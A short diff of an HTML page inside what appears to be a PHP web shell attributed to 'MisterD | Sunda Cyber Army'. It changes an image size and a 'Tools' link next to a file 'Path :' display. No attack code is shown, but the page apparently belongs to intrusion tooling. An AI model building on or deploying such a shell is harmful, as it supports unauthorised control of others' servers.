@@ -47,7 +47,7 @@ border-radius:5px;
 </head>
 <body>
      <center><br><br>
-    	<img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="250" height="">
+    	<img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="270" height="240">
       </center>
     <h3><font color="red" MisterD | Sunda Cyber Army </h3></font.
     <div class="greetings">
@@ -63,7 +63,7 @@ border-radius:5px;
 	<br>
 ?? | <a href="https://www.xploiters77.ml/">Website</a> | ??
     	<br>
-?? | <a href="http://sundacyberarmy.6te.net/tool">Tools</a> | ??
+?? | <a href="http://scaxploiters77.cf">Tools</a> | ??
     </div><br>
 <table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font> ';
